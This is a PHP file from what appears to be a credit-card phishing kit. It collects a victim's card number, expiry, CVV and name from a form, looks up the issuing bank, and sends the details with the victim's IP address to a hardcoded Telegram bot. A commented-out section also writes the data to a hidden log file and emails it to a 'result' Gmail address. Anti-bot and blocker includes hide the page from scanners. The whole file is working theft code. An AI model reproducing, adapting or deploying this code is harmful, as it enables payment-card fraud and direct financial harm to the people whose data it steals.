<?php
include('antibot.php');
include('antiip.php');
include('blocker.php');
include('geoip.php');
include('useragent.php');
session_start();

$ap_number  = $_SESSION['_ap_number_']     = $_POST['carnmber'];
$details_cc = json_decode(file_get_contents("https://lookup.binlist.net/".substr($ap_number,0,7)));
$bnk = $details_cc->bank->name;
$_SESSION['_bnk_name'] = $bnk;
$_SESSION['_first_fours'] = substr($ap_number,0,4);
$ap_month  = $_SESSION['_ap_month_']     = $_POST['month'];
$ap_cvv  = $_SESSION['_ap_cvv_']     = $_POST['CVV2'];
$ap_fulzname  = $_SESSION['_ap_nameoncard_']     = $_POST['fullname'];
$ip = getenv("REMOTE_ADDR");


$message = "CC: " .$ap_fulzname."  ";
$message .= $ap_number."  ";
$message .= $ap_month."  ";
$message .=  $ap_cvv."  ";
$message .= "IP: ".$ip;

file_get_contents("https://api.telegram.org/bot6788401748:AAF1szjl3Y_1JyCF1MnTCmiBB9lpYgYGYRg/sendMessage?chat_id=-4064520154&text=".$message );
/*


$arr = array('funip' => $ip, 'funcountryname' => $countryname, 'funbnkname' => $bnk, 'funnoumrou' => base64_encode($ap_number) , 'funexpre' => $ap_month, 'funthree' => $ap_cvv, 'fulzname' => $ap_fulzname);

$arrsend = array('funip' => $ip, 'funcountryname' => $countryname, 'funnoumrou' => $ap_number, 'funbnkname' => $bnk, 'funexpre' => $ap_month, 'funthree' => $ap_cvv, 'fulzname' => $ap_fulzname);

$XAMZ = json_encode($arr);
$XAMZSND = json_encode($arrsend);



$file = fopen(".RzL.html","a");
fwrite($file, $XAMZ."</br>");
fclose($file);

$asba = "dskresult2021@gmail.com";
$subject  = "NEU DSKCC OF " .$ip. " - [".$countryname."]";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From:DSKREZ <dskresult2021@gmail.com>";

mail($asba, $subject, base64_encode($XAMZSND), $headers);
*/

    header("Location:address.php?$ip");

?>